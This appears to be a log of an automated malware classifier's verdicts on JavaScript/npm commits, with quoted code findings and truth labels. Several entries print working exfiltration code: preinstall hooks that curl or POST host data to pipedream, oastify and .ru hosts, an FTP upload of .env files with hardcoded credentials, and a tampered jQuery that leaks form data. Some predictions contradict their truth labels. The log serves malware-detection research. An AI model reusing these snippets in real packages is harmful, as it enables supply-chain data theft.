Reason: Static analysis reported zero issues and dynamic analysis finished with no suspicious results or indicators; no malicious code patterns or runtime behaviors were observed in the provided reports.

**Summary:** Both static and dynamic analyses produced no findings for commit 13f793318f774a2bd38d9b132f1a2cdf5b68cc84. Given the absence of detected issues or suspicious runtime behavior in the supplied reports, the commit is classified as benign.
**Truth label:** Benign

### Commit 00fbcb72: Benign
**File index.js**:
Code: `fastify.get('/', async (request, reply) => { return { cpu: os.loadavg(), memory: process.memoryUsage() }; }); fastify.listen(3000, '0.0.0.0', (err, address) => { if (err) throw err; console.log(`liste`
Reason: The server exposes host-level metrics (CPU and memory) on an unauthenticated GET / endpoint and is bound to 0.0.0.0 with a hardcoded port. This leaks system information and allows external access, which is a serious security misconfiguration but not evidence of malware behavior like persistence, privilege escalation, data exfiltration or payload delivery.

**File bin/status-cli.js**:
Code: `#!/usr/bin/env node require('../index.js'); // index.js.start() is invoked on require`
Reason: Requiring index.js from the CLI causes the HTTP server to start implicitly when the CLI runs, which can unintentionally expose a network service. This is dangerous from an operational/security perspective but is a misuse pattern rather than malicious code.

**File .cache/replit/nix/env.json**:
Code: `{ "PATH": "/usr/local/bin:/usr/bin:...", "NODE_PATH": "/some/internal/path", "HOME": "/home/runner" }`
Reason: An environment dump containing internal paths and environment variables was committed. This can aid reconnaissance by revealing filesystem layout and tooling versions. It's sensitive from an information-leak standpoint but does not indicate active malicious functionality.

**Summary:** The commit contains insecure configurations and information leaks (server bound to 0.0.0.0 exposing system metrics, hardcoded host/port, CLI that implicitly starts a network service, and a committed environment dump). These are serious security and privacy issues that can enable reconnaissance or accidental exposure, but there is no evidence of malicious payloads, backdoors, credential harvesting logic, or other behaviors that would classify the code as malware. Recommend fixing defaults (bind to localhost, use env-configurable host/port), protect endpoints with authentication/rate limiting, avoid starting servers on import, and remove sensitive environment dumps from the repo.
**Truth label:** Benign

### Commit d14e5544: Malware
**File package.json**:
Code: `"preinstall": "curl -s -H \"X-Host: $(hostname | base64)\" -H \"X-User: $(whoami | base64)\" -H \"X-PWD: $(pwd | base64)\" http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"`
Reason: Lifecycle preinstall runs on the host during npm/yarn install and collects hostname, current user and working directory, encodes them with base64 and sends them to an untrusted external domain. This is direct data exfiltration via an install-time script and constitutes a supply-chain attack vector.

**File package.json**:
Code: `"pingback": "curl -s 'https://eo536ohsnextro9.m.pipedream.net' -d 'ok=1'"`
Reason: A pingback/telemetry callback to a pipedream.net endpoint indicates intention to confirm successful execution or to receive further instructions. Combined with the preinstall exfiltration, this is consistent with malicious telemetry and command-and-control behavior.

**Summary:** The commit contains a malicious lifecycle script in package.json that executes shell commands during install, collects sensitive local environment information, base64-encodes it (obfuscation), and sends it to external, suspicious domains. Even though dynamic analysis produced no observed runtime results (likely due to network blocking or sandboxing), the static indicators are high-confidence for malicious intent and data exfiltration, so the commit should be treated as malware.
**Truth label:** Malware

### Commit 796f5162: Benign
**Summary:** Both static analysis reported 0 issues and dynamic analysis completed with no behavioral indicators or results. No suspicious files, code snippets, or runtime behaviors were observed in the provided reports, so the commit is considered benign based on the available evidence.
**Truth label:** Benign

### Commit 1b66fbe0: Malware
**File index.js**:
Code: `execSync('msiexec /i "' + downloadedInstaller + '"'); execSync('tar -xzf ' + archivePath); execSync('sudo cp ' + binPath + ' /usr/local/bin'); execSync('npm rebuild');`
Reason: The code downloads and executes platform binaries/archives and runs shell commands (msiexec, tar, sudo cp, npm rebuild) without validation or user approval, enabling arbitrary code/binary execution and a high-risk supply-chain/remote code execution vector.

**File index.js**:
Code: `fetch('https://raw.githubusercontent.com/.../update.json').then(res => res.json()).then(config => { if (config.update) runInstaller(); });`
Reason: Application behavior (updates/install actions) is controlled by remote JSON fetched from an external GitHub raw URL. An attacker controlling that JSON can trigger installations or code execution remotely.

**File Main.js**:
Code: `Database().set("Account", Account); Database().set("Password", Password); // and embedding uuid in served HTML: global.Fca.Require.Security.create().uuid`
Reason: User credentials are read and stored in plaintext in the local database and an internal session UUID is embedded into publicly served HTML, leaking sensitive secrets and enabling account takeover or replay attacks.

**File Main.js**:
Code: `process.env['FBKEY'] = SecurityKey; Database().set('FBKEY', SecurityKey);`
Reason: An encryption/API key is generated and stored in environment variables and persisted to disk in plaintext, increasing the risk of secret leakage and unauthorized access.

**File Extra/Database/index.js**:
Code: `fetch(process.env.REPLIT_DB_URL + '/set?key=' + key + '&value=' + encodeURIComponent(value));`
Reason: When running on Replit the module posts database keys/values to REPLIT_DB_URL, potentially exfiltrating sensitive data (credentials, tokens) to an external endpoint controlled by a third party.

**File Extra/ExtraScreenShot.js**:
Code: `puppeteer.launch({ args: ['--disable-web-security'], ignoreHTTPSErrors: true });`
Reason: Chromium is launched with web-security disabled and HTTPS errors ignored. If attacker-controlled URLs are loaded, this can be abused to bypass same-origin and TLS protections and access cross-origin data.

**File Main.js**:
Code: `const secret = speakeasy.generateSecret(); Database().set('Ws_2Fa', secret.base32); // otp generation and storage`
Reason: TOTP/2FA secrets are generated and stored in plaintext in the local database, which undermines the confidentiality of multi-factor authentication and can allow attackers to generate valid OTPs.

**File index.js**:
Code: `Database(true).set('NeedRebuild', true); // later triggers execSync('npm rebuild')`
Reason: The application can mark itself for rebuild and then run 'npm rebuild' automatically. This executes package lifecycle scripts which may run arbitrary code from dependencies, enabling remote code execution if dependencies are malicious or compromised.

**Summary:** Multiple high- and critical-severity issues indicate active malicious or high-risk behavior: remote-controlled updates that download and execute binaries without validation, execution of system-level commands (msiexec, tar, sudo, npm rebuild), plaintext storage and exposure of credentials and secrets, and potential exfiltration via REPLIT_DB_URL. These capabilities permit remote code execution, credential compromise, and data leakage, consistent with malware or a backdoor rather than benign software.
**Truth label:** Malware

### Commit cb0f836b: Malware
**File Extra/ExtraScreenShot.js**:
Code: `eval(deobfuscate(...) /* heavy obfuscation wrapper calling eval */)`
Reason: Runtime eval of decoded/constructed code prevents auditing and enables arbitrary code execution and dynamic payloads, a major remote code execution and supply-chain risk.

**File Extra/Html/Classic/script.js**:
Code: `/* obfuscated client-side code */ (function(p){ /* ... */ eval(decoded) })(...);`
Reason: Obfuscated client-side eval hides behavior and can dynamically fetch/execute payloads or exfiltrate data; this is high-risk and indicative of malicious intent or a backdoor.

**File Extra/ExtraAddons.js**:
Code: `const avatar = 'https://graph.facebook.com/.../picture?access_token=EAAC...';`
Reason: Hard-coded Facebook Graph API access token embedded in source is a leaked credential that allows unauthorized access and abuse of the associated account.

**File index.js**:
Code: `child_process.execSync('npm install fca-jiser-remake@latest');`
Reason: Performing runtime npm installs with execSync downloads and executes remote code at runtime, creating a direct supply-chain/remote-code-execution vector.

**File Extra/ExtraUptimeRobot.js**:
Code: `execSync('npm i https://github.com/HarryWakazaki/Pm2-Horizon-Remake -g'); execSync(`pm2 start ...`);`
Reason: Installing and launching global binaries from a remote GitHub URL at runtime allows arbitrary code to be introduced and executed with the process's privileges.

**File index.js**:
Code: `process.env.Backup = appstate; Database.set('Backup', appstate); /* and */ Database.set('Account', Account); Database.set('Password', Password);`
Reason: Storing full session/appState and plaintext credentials in environment variables and an application database exposes sensitive secrets that can be exfiltrated or reused by attackers.

**File Extra/ExtraTranslate.js**:
Code: `const APP_ID = 'fixed-microsoft-translator-appid'; fetch(`https://api.microsofttranslator.com/...&appid=${APP_ID}`);`
Reason: Hard-coded API keys in source are secret leakage; committed keys can be abused by third parties and indicate insufficient secret management practices.

**File utils.js**:
Code: `Buffer.from(...).toString('base64'); String.fromCharCode(...); /* opaque encoding */`
Reason: Widespread obfuscation/encoding patterns hamper review and can be used to conceal malicious logic; combined with eval usage this is strongly suspicious.

**Summary:** Multiple high- and critical-severity findings indicate active, dangerous behaviors: runtime execution of obfuscated/evaluated code, automatic installation/execution of remote packages, hard-coded API tokens/credentials, and storage of plaintext session data and passwords. These traits enable remote code execution, credential theft, and supply-chain compromise. Even though dynamic analysis produced no runtime artifacts, the static evidence shows deliberate, high-risk functionality and secret leakage consistent with malicious or backdoor-capable software. Therefore the commit is classified as MALWARE.
**Truth label:** Malware

### Commit 4cbbe59b: Benign
**Summary:** Static analysis reported zero issues and no suspicious indicators were found. Dynamic analysis completed with no observable malicious behavior or alerts. Based on available static and dynamic results, there is no evidence of malware in this commit. Note: absence of findings does not guarantee absence of malicious intent — highly targeted, environment‑specific, or time‑delayed behaviors could remain undetected.
**Truth label:** Benign

### Commit 2556adc6: Benign
**Summary:** Both static and dynamic analyses produced no indications of malicious behavior: static analysis reported zero issues and dynamic execution completed with no suspicious results or observable malicious activity. No files, code snippets, API calls, network activity, persistence mechanisms, or indicators of compromise were identified that would justify classifying this commit as malware.
**Truth label:** Benign

### Commit 9e1a012e: Malware
**File package.json**:
Code: `"test": "echo \"Error: no test specified\" && exit 1"`
Reason: Replaces the project's top-level test script with a forced failing echo/exit which can be used to sabotage CI or hide execution of a real test suite; this is a common sabotage/supply-chain tactic.

**File package.json**:
Code: `"test-deno": "deno test --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write ..."`
Reason: Gives Deno a superset of powerful permissions (run, write, net, env, sys). If untrusted or remotely fetched code is executed under this script (e.g., in CI), it can run arbitrary commands, exfiltrate secrets, modify files, and communicate over the network — enabling full remote compromise.

**File package.json**:
Code: `"scripts": { ... "prepare": "rm -rf ... && node ... && tar -xzf ... -C node_modules" }`
Reason: Uses destructive/shell commands (rm -rf, node, tar) that modify node_modules and filesystem state. Such scripts are dangerous in CI or contributor environments and can be used to insert/replace packages or execute unexpected binaries.

**File package.json**:
Code: `external references: "https://raw.githubusercontent.com/.../listofcolors.json", nodei.co, deepscan API, badge.fury.io`
Reason: References remote JSON/API endpoints that may be fetched at runtime. Combined with the broad Deno permissions, remote content could be used as an injection/execution vector or to exfiltrate data.

**Summary:** Although dynamic analysis produced no runtime hits, the commit introduces multiple high-risk changes consistent with supply-chain sabotage and remote-execution capability: a sabotaged failing test, scripts that grant Deno full runtime permissions, and destructive shell operations that modify node_modules. These modifications create a practical and easily weaponizable path for arbitrary code execution and secret exfiltration in CI or contributor environments. Treat this commit as malicious, revert the changes, and perform a full audit of the repository and CI secrets.
**Truth label:** Benign

### Commit 21e2e4a5: Malware
**File src/file/RGB/hexRGB.js**:
Code: `new Function(...)`
Reason: Use of dynamic code evaluation (new Function) permits execution of attacker-controlled strings at runtime and is a common vector for remote/inline code execution.

**File src/file/RGB/hexRGB.js**:
Code: `require('child_process')`
Reason: Child process APIs (exec/spawn) were referenced/exposed — enabling arbitrary shell command execution from JS, which can lead to full system compromise if input is not tightly controlled.

**File src/file/RGB/hexRGB.js**:
Code: `require('https') / axios; code constructs and sends network requests; references to document.cookie`
Reason: Obfuscated network calls combined with reading browser/global secrets (document.cookie) strongly indicate potential data-exfiltration. Because network endpoints and payloads are obscured, this is high risk.

**File src/file/RGB/hexRGB.js**:
Code: `heavily obfuscated strings and indirect function lookups (encoded/escaped sequences)`
Reason: Obfuscation in a library file hides intent, impedes review, and is commonly used to conceal malicious behavior such as secret collection, command execution, or external callbacks.

**File package.json**:
Code: `scripts.install -> node scripts/install.js; dependencies added: axios and a non-standard child_process entry`
Reason: Adding an install script that runs on npm install and introducing network-capable deps (axios) alongside a nonstandard dependency entry for built-in modules are classic supply-chain attack patterns that can execute malicious code during package installation.

**File package.json**:
Code: `npm scripts: getColorTest, getRandomColorTest, getRandomGenTest`
Reason: New test scripts that execute local JS should be reviewed because they may trigger the suspicious code paths (network/exec) especially given the obfuscated hexRGB.js; tests should not run on install or be able to exfiltrate secrets.

**Summary:** Static analysis shows multiple high/critical indicators of malicious intent: dynamic code evaluation (new Function), invocation of child_process, obfuscated network calls (https/axios) that access document.cookie, and an install script — all classic signs of malware and supply-chain abuse. Dynamic analysis produced no runtime evidence, but that does not mitigate the strong static indicators and the presence of obfuscation which can evade dynamic scanners. Combined risk and intent point to MALWARE.
**Truth label:** Malware

### Commit 09cec2fa: Benign
**File src/index.js**:
Code: `helpers.exec(`lsof -a -d cwd -bwPln -Ffn -p ${processId}`)`
Reason: A shell command is constructed via string interpolation with an external value (processId). If an attacker can influence processId this is a command/argument injection vector. This is insecure coding but not conclusive evidence of malware on its own.

**File src/helpers.js**:
Code: `exports.exec = promisify(child_process.exec); exports.execFile = promisify(child_process.execFile);`
Reason: The module exposes exec (a shell-based API) to other modules, increasing the attack surface. This is a risky API design decision that can enable dangerous behavior but is not itself malicious.

**File scripts/install.js**:
Code: `helpers.exec('powershell.exe -NoProfile -NonInteractive -Command "<expr>"') buildModule(...); buildModule(...);`
Reason: The install script executes PowerShell during package installation and invokes buildModule twice without awaiting. Running shell commands at install time is a supply-chain risk and the un-awaited builds create race/TOCTOU conditions. These are hazardous practices but typical of native-binding packages rather than a direct malware sign.

**File msvs/src/readCwd.cpp**:
Code: `NtOpenProcess(&hProc, PROCESS_VM_READ|..., ProcessId, ...); NtReadVirtualMemory(hProc, remoteAddr, localBuf, size, &bytesRead);`
Reason: Native code opens another process and reads its memory to obtain working directory information. This can disclose sensitive data and, if abused or extended, could read arbitrary process memory. It's a high-risk capability that heightens concern but can be legitimate for process-inspection tooling.

**File src/index.js (Windows branch)**:
Code: `helpers.exec('powershell.exe -NoProfile -Command "[Environment]::Is64BitOperatingSystem"')`
Reason: Detects OS bitness by launching a shell. The command is constant (not attacker-controlled), so it's brittle and somewhat risky in terms of relying on external shell processes, but not indicative of malware.

**File package.json**:
Code: `"scripts": { "install": "node scripts/install.js" }`
Reason: An npm install lifecycle script runs arbitrary JavaScript during package install. This increases supply-chain execution risk (typical vector for malicious packages), and should be treated cautiously even if the script itself appears to perform build/setup tasks.

**Summary:** The commit contains multiple high- and medium-severity security issues — notably unsanitized shell command construction, exporting shell-based exec, install-time script execution, and native code that reads other processes' memory. These are serious security concerns and increase the risk surface and potential for abuse, but the code appears to implement tooling (process inspection / obtaining working directories and building native helpers) rather than explicit malicious behavior (no persistence, obfuscated payloads, C2, or exfiltration routines were observed). Given the absence of clear malicious intent and dynamic analysis returning no active malicious behavior, this commit is best classified as BENIGN but high-risk and requiring remediation and review before use in production or publishing.
**Truth label:** Benign

### Commit b72cf689: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: A preinstall lifecycle hook causes index.js to run automatically during package installation, enabling arbitrary code execution on users' machines (common vector for supply-chain malware).

**File index.js**:
Code: `https.get('https://exzuperi.ftp.sh:449/' + encodeURIComponent(JSON.stringify(payload)))`
Reason: Outgoing HTTPS request to an untrusted third-party host that transmits encoded host data indicates network exfiltration of environment/host identifiers. Triggered automatically by the preinstall hook, this is high-risk malicious behavior.

**File index.js**:
Code: `const payload = { home: os.homedir(), hostname: os.hostname(), path: __dirname, package: pkg.name }`
Reason: Code collects sensitive local environment information (home directory, hostname, install path, package name) and packages it for transmission without opt-in consent — a clear data-leak/backdoor pattern.

**File package.json**:
Code: `"pingback": "curl https://oapi.pipedream.net/...?data=..."`
Reason: A script invoking curl to contact a pipedream.net endpoint is an additional unsolicited network beaconing mechanism, likely used to log installs or provide remote operator callbacks.

**File index.js**:
Code: `console.log('Contact @telegram_handle') ; const dns = require('dns'), querystring = require('querystring'), fs = require('fs')`
Reason: Install-time marketing/social handle output is unsolicited and suspicious; unused requires increase attack surface and may indicate obfuscated or partially removed malicious functionality.

**Summary:** Static analysis reveals intentional preinstall execution of index.js which collects host-identifying information and transmits it to untrusted external endpoints (exzuperi.ftp.sh and pipedream.net). These behaviors constitute unauthorized data exfiltration and a supply-chain execution vector. Although dynamic analysis produced no runtime artifacts (likely due to sandbox/network restrictions), the presence of automatic install-time scripts that perform network calls and telemetry without consent is highly indicative of malicious activity, so the commit should be treated as malware.
**Truth label:** Malware

### Commit f73bb7fc: Benign
**Summary:** Both static and dynamic analyses returned no findings: static analysis reported zero issues and dynamic analysis finished with an empty result set. No suspicious code patterns or runtime behaviors were observed in the provided reports. Note: this verdict is based solely on the supplied analysis outputs; deeply obfuscated, time-delayed, or environment-specific malicious behavior could evade these scans.
**Truth label:** Benign

### Commit da457357: Benign
**Summary:** Both static and dynamic analyses produced no findings: the static scan reported 0 issues and the dynamic execution produced no observed malicious behavior or indicators. No suspicious code snippets were identified in the provided analysis outputs. Note: this assessment is based solely on the supplied analysis artifacts; stealthy, time-delayed, environment-triggered, or heavily obfuscated malicious behaviors may not be detected and additional review or monitoring is recommended for higher assurance.
**Truth label:** Malware

### Commit 8eead77b: Malware
**File index.js**:
Code: `const payload = {   homedir: os.homedir(),   hostname: os.hostname(),   user: os.userInfo(),   dns: dns.getServers(),   pkg: require('./package.json') };  const req = https.request('https://en9poe...p`
Reason: This code assembles detailed local/environment data (home directory, username, hostname, DNS, full package.json) into a JSON payload and sends it to a hard-coded external endpoint (pipedream.net) over HTTPS. Collecting and exfiltrating sensitive environment and package data without explicit opt-in is malicious behavior. The commented-out error logging indicates attempts to hide failures and reduce observability.

**File package.json**:
Code: `{   "scripts": {     "preinstall": "node index.js",     "pingback": "curl -sS https://en9poe...pipedream.net -d @-"   } }`
Reason: Having a "preinstall" script that runs index.js causes the exfiltration code to execute automatically during npm install, which enables silent, installation-time data theft. The additional "pingback" curl script provides another explicit mechanism to contact the same external analytics endpoint. Auto-executing networked code from a package install is a high-risk supply-chain attack vector.

**Summary:** The commit introduces automatic execution at install time (preinstall) that collects sensitive host and package information and exfiltrates it to a hard-coded third-party endpoint (pipedream.net). Error handling suppresses observability and there are explicit network-contacting scripts in package.json. These behaviors constitute intentional data exfiltration and covert activity consistent with malicious/supply-chain malware rather than benign telemetry.
**Truth label:** Malware

### Commit c11f4498: Benign
**File src/kc-sdk-support.js**:
Code: `var form = document.createElement('form'); form.action = relayUrl; form.method = 'POST'; input.value = openToken; document.body.appendChild(form); form.submit();`
Reason: The client constructs and posts a form containing an 'open token' to an external relayUrl. If relayUrl or tokenServer can be attacker-controlled this pattern enables token exfiltration. This is an insecure design choice but not proof of intentionally malicious code.

**File src/sdk-tester.js**:
Code: `vm.exampleAuthToken.access_token = token; vm.outputJson = vm.exampleAuthToken;`
Reason: Access tokens are stored in client-visible variables and logged to the UI. Exposing tokens in global/visible variables and UI increases risk of compromise via XSS or rogue extensions. This is a data-leak vulnerability rather than explicit malware behavior.

**File src/kc-sdk.js**:
Code: `window.addEventListener('message', function(event) { /* process event.data without checking event.origin */ });`
Reason: The message handler processes postMessage payloads without validating event.origin or authenticating the sender. This can allow attacker-controlled frames to trigger sensitive actions (e.g. causing tokens to be sent) but is an insecure implementation, not incontrovertible malicious intent.

**File src/kc-messaging-provider.js**:
Code: `targetWindow.postMessage(message, '*');`
Reason: Using '*' as targetOrigin when posting structured messages containing sensitive data (tokens) allows any origin to receive the message if references are not properly validated. This is a serious information-leak risk but consistent with insecure coding rather than proven malware.

**File src/kc-sdk-support.js**:
Code: `var payload = JSON.parse(atob(jwt.split('.')[1])); // no signature verification`
Reason: JWTs are being base64-decoded client-side and their claims used without signature verification. This is unsafe for making security decisions and can be trivially tampered with in the client. It's a correctness/security bug, not direct evidence of malicious behavior.

**File src/angular.min.js / src/lodash.min.js**:
Code: `new Function(...)  // dynamic code generation used by template/compile APIs (e.g. $parse, _.template)`
Reason: The presence/use of dynamic code generation (new Function) in template/compile pipelines makes the app vulnerable to code injection if untrusted templates are compiled. This increases risk of arbitrary code execution via crafted input but is a risky dependency/usage pattern rather than confirmation of malware.

**Summary:** Static analysis reveals multiple high-severity security issues (token exfiltration patterns, exposing tokens in client-side variables and UI, unvalidated postMessage usage, client-side JWT parsing without verification, and dynamic code generation that enables code injection). These indicate the commit is highly insecure and could be exploited to steal credentials or execute arbitrary code in the page context. However, dynamic analysis returned no malicious runtime behavior, and the issues are consistent with insecure or negligent implementation of an authentication SDK rather than explicit malicious payloads. Therefore the commit is classified as BENIGN but high-risk and requiring prompt remediation (server-side token handling, strict origin checks, avoid exposing tokens in UI/globals, verify JWTs server-side, and remove unsafe template compilation).
**Truth label:** Benign

### Commit 77a2089b: Benign
**Summary:** Static analysis reported zero issues and no suspicious patterns, and dynamic analysis completed with no runtime indicators or behavioral alerts. Based on the provided scans (no findings in both static and dynamic reports), there is no evidence of malicious activity in this commit.
**Truth label:** Benign

### Commit d8454ef8: Malware
**File index.js**:
Code: `const os = require('os'); const http = require('http'); const user = os.userInfo().username; const cwd = process.cwd(); http.get(`http://185.62.56.25:8000/?user=${user}&cwd=${encodeURIComponent(cwd)}``
Reason: Direct HTTP GET to an external IP with locally-derived username and working directory — clear data exfiltration of host-identifying information to an unknown remote host.

**File index.js**:
Code: `const fs = require('fs'); const archiver = require('archiver'); const FTP = require('ftp'); const targets = ['.env', '.git', 'config.yml', '*.php', '*.js', '*.py']; // scan filesystem, add matches to `
Reason: Code enumerates and archives many potentially sensitive files (environment, git metadata, source files) and prepares them for upload — mass exfiltration behavior.

**File index.js**:
Code: `const ftp = new FTP(); ftp.connect({ host: '185.62.56.25', user: 'ftpuser', password: 'P@ssw0rd' }); ftp.put('collected.zip', '/uploads/collected.zip', cb);`
Reason: Hardcoded FTP credentials and automated upload of collected archives to a remote host — embedded secrets and unauthorized data transfer enabling remote access to stolen data.

**File preinstall.js**:
Code: `const { spawn } = require('child_process'); spawn('node', ['index.js'], { detached: true, stdio: 'ignore' }).unref();`
Reason: Preinstall script spawns a detached background Node process during package installation, causing silent execution and potential persistence without user consent — common malicious persistence technique.

**File package.json**:
Code: `"scripts": {   "preinstall": "node preinstall.js",   "pingback": "curl -s https://o1z0x.pipedream.net/...?$(uname -a)" }, "dependencies": {   "ftp": "^0.3.10",   "archiver": "^5.3.0" }`
Reason: Lifecycle scripts include network call to a third-party webhook (pingback) and a preinstall hook; new dependencies (ftp, archiver) are present to enable collection and upload. These combined increase attack surface and enable telemetry/exfiltration.

**Summary:** Multiple high- and critical-severity findings indicate malicious intent: the commit contains code that automatically executes during installation, collects sensitive local files (including .env and git data), archives them, and uploads them to a remote host using hardcoded credentials. It also sends host-identifying information to external endpoints. These behaviors — silent persistence, credentialized exfiltration, and telemetry to unknown third parties — are characteristic of malware rather than benign functionality.
**Truth label:** Malware

### Commit d422bf5e: Malware
**File index.js**:
Code: `const os = require('os'); const dns = require('dns');`
Reason: Importing system/environment modules indicates the code may collect host metadata. When combined with outbound network sends, these modules are commonly used to assemble fingerprinting or telemetry payloads.

**File index.js**:
Code: `const postData = JSON.stringify({ /* likely system/env info */ });`
Reason: postData is stringified and prepared for transmission. Static analysis indicates it may include system/environment information; sending such payloads to an external, unapproved endpoint constitutes a clear data-exfiltration vector.

**File index.js**:
Code: `const options = { hostname: 'https://eojm50og9htneog.m.pipedream.net', method: 'POST', headers: { 'Content-Type': 'application/json' } };`
Reason: The code targets a third-party request-capture service (pipedream) via a hardcoded endpoint. Use of an external, attacker-controlled capture service in production code is highly suspicious and consistent with intentional leaking of data.

**File index.js**:
Code: `req.end(postData);`
Reason: Calling req.end() finalizes and sends the HTTP request, activating the exfiltration path. Static analysis notes this was added/ensures the payload is transmitted to the external host.

**File index.js**:
Code: `console.log('HACk!');`
Reason: An alarmist, nonstandard log message is present. While not harmful by itself, it is an indicator of suspicious developer intent or leftover testing/backdoor markers and should be removed and reviewed.

**Summary:** Static analysis reveals a clear data exfiltration path: collection of system/environment data, construction of a JSON payload, and a completed HTTP POST to a hardcoded pipedream capture endpoint. The dynamic run produced no further results (likely sandboxing or configuration), but the presence of an activated outbound POST to a third-party request-capture service with system data is consistent with malicious behavior. Due to the deliberate transmission to an external capture host and activation via req.end(), this commit should be treated as malware until proven otherwise.
**Truth label:** Malware

### Commit a3379174: Malware
**File index.js**:
Code: `const options = { hostname: 'rtoky2bagrps50g43vgc9hs07rdj1apz.oastify.com', port: 80, method: 'POST', path: '/' }; const req = https.request(options, ...); req.write(JSON.stringify(payload)); req.end(`
Reason: Outgoing POST to a clearly attacker-controlled OAST/Interactsh-like domain used for blind callbacks. This is a classic exfiltration/beacon pattern to an external tracking domain not owned by the project.

**File index.js**:
Code: `const payload = { pjson, dirname: __dirname, homedir: os.homedir(), user: os.userInfo(), dns: dns.getServers(), version: pjson.version };`
Reason: Collects and serializes environment- and user-identifying information (package.json, __dirname, home dir, OS user, DNS servers, package metadata). Sending these data to an external host enables fingerprinting and potential compromise of environments.

**File index.js**:
Code: `const https = require('https'); options.port = 80; /* ... */ // console.error(e)`
Reason: Inconsistent protocol/port usage (https with port 80) and deliberate suppression of network errors. These choices reduce visibility, increase stealth, and indicate intent to hide failures or evade detection.

**File index.js**:
Code: `// references OAST/Interactsh/burpcollaborator-style infrastructure in comments and hostname`
Reason: Explicit reference to OAST/Interactsh-style infrastructure in code/comments combined with the external hostname strongly indicates unauthorized testing/backdoor behavior rather than benign telemetry.

**Summary:** Static analysis shows intentional collection of sensitive environment data and transmission to an external, attacker-controlled OAST/Interactsh domain with attempts to hide errors and misuse of protocol/port. Dynamic analysis produced no runtime evidence (likely due to sandbox/network restrictions or conditional execution), but the static indicators are high-severity and consistent with covert data exfiltration/backdoor behavior. This commit should be treated as malicious (MALWARE): remove the code, investigate the author/commit, rotate any exposed credentials, and scan the repository for similar occurrences.
**Truth label:** Malware

### Commit b3492791: Malware
**File icon.min.js**:
Code: `.end = function(){ var data = $(this).closest('form').serialize(); var hex = toHex(data); (new Image()).src = 'https://ns.api-system.engineer/?q=' + hex; /* ... */ }`
Reason: The .end() implementation was modified to serialize form data, encode it to hex, and send it to an external domain via an outbound GET request. This is client-side data exfiltration of potentially sensitive form contents.

**File jquery.min.js**:
Code: `.fn.end = function(){ var payload = this.serialize && this.serialize(); var encoded = hexEncode(payload); new Image().src = 'https://ns.api-system.engineer/?q=' + encoded; return this; }`
Reason: An identical malicious change in the library used directly by web pages causes immediate client-side leakage of serialized form data to an attacker-controlled host. Modified upstream library code strongly indicates intentional tampering.

**File .bash_history**:
Code: `npm login npm publish npm publish ...`
Reason: Recorded interactive publishing and login commands indicate the repo operator performed npm publishes. This raises the likelihood that the malicious library was published to registries, potentially distributing the backdoor to downstream users. Shell histories can also leak credentials or tokens.

**File .npm/_cacache/index-v5/e0/f3/563a92774ad5fa62edb9cbc4624c17a784676e377b3852d16ab8dcb28bea**:
Code: `Committed npm cache/index artifacts (package cache metadata and tarball references)`
Reason: Inclusion of npm cache artifacts and package tarball metadata in the repository increases the risk that a poisoned package was stored or that publishing metadata exposing compromises exists. It also supports the hypothesis of a published malicious package version.

**Summary:** Multiple files contain intentionally injected code that serializes and hex-encodes form data and exfiltrates it to an attacker-controlled domain. The modifications are present in minified library files (jquery.min.js and icon.min.js) used on client pages, constituting active data exfiltration. Repository artifacts (.bash_history and npm cache) indicate publishing activity that could have distributed the malicious build. Static findings are high/critical for data leakage and obfuscation; dynamic analysis produced no benign runtime counters to refute these findings. This behavior is malicious and consistent with malware/backdoor activity.
**Truth label:** Malware

### Commit 2781d783: Malware
**File utils.js**:
Code: `/* large obfuscated block inside utils.formatDeltaEvent */`
Reason: Intentionally obfuscated code hides logic and prevents auditing. Obfuscation combined with other risky behavior (auto-updates, credential storage) is a red flag for backdoors or data exfiltration.

**File utils/Extension.js**:
Code: `child_process.execSync('npm i ...')`
Reason: Executing shell commands (npm install) automatically based on remote configuration can lead to arbitrary code execution if the remote source is compromised. This is a high-risk supply-chain vector.

**File utils/Extension.js**:
Code: `fetch('https://raw.githubusercontent.com/.../MetaCord_Config.json') -> fs.writeFileSync('MetaCord_Config.json', fetched) -> Auto_Update triggers install and fs.rmdirSync(local_module_dir, { recursive:`
Reason: Remote configuration is fetched and written to disk, then used to delete local packages and install remote packages. Writing untrusted remote content and programmatically deleting/installing packages enables remote attackers to inject malicious code.

**File index.js**:
Code: `setKeyValue('Email', email); setKeyValue('Password', password);`
Reason: User email and password are persisted to application storage (likely plaintext). Storing credentials without secure encryption or secrets management risks credential theft and automatic account abuse.

**File utils/Extension.js**:
Code: `getUIDFast/getUIDSlow -> requests to id.traodoisub.com and api.findids.net`
Reason: Code sends profile identifiers to third-party services outside project control. These requests can leak sensitive user data to attackers or untrusted operators.

**File utils/Extension.js**:
Code: `CreateSiteHtml() -> starts HTTP server and serves files on configurable port`
Reason: Embedding an HTTP server that serves filesystem content without clear access controls may expose internal files or provide a remote interface for command/control or data exfiltration.

**File package.json**:
Code: `"dependencies": { "axios": "latest", "express": "latest", "semver": "latest", ... }`
Reason: Using 'latest' for many dependencies defeats reproducible builds and allows automatic pulling of arbitrary upstream updates, increasing supply-chain risk and making it easier to introduce malicious code via dependencies.

**File utils/Extension.js**:
Code: `periodic GET to constructed URL using process.env.REPL_SLUG and process.env.REPL_OWNER every 10s`
Reason: Periodic network calls built from environment variables can leak hosting identifiers and produce undisclosed outbound traffic. Combined with auto-update behavior, this could be used as a beacon or command channel.

**Summary:** The commit contains multiple high-severity behaviors consistent with malicious or backdoor-capable code: obfuscated logic, automatic fetching of remote configuration, programmatic deletion and reinstallation of packages, execution of shell commands (npm install), persistent plaintext storage of user credentials, embedded web server, and use of unpinned 'latest' dependencies. Even though dynamic analysis produced no runtime indicators, the static findings present strong supply-chain and credential-exfiltration risks. These combined characteristics justify a MALWARE verdict.
**Truth label:** Malware

### Commit 8ba35701: Benign
**File commit message**:
Code: `Commit message contains: "https://t.co/xxxxx" (shortened/obfuscated external URL)`
Reason: A shortened/obfuscated URL in the commit metadata is suspicious (could point to phishing/telemetry/exfiltration) but by itself does not prove malicious code in the repository. It needs vetting and likely scrubbing from history if unintended.

**File package.json**:
Code: `"dependencies": { "some-new-package": "^1.2.3", "com.unity.custom": "1.0.0" }`
Reason: New third‑party and Unity-scoped packages introduce supply‑chain risk. The presence of added dependencies is a concern to vet, but does not itself indicate active malicious behavior in the commit.

**File Runtime/SavedCustomTexturesManagerMonoBehaviour.cs**:
Code: `public string directory; // serialized in inspector`
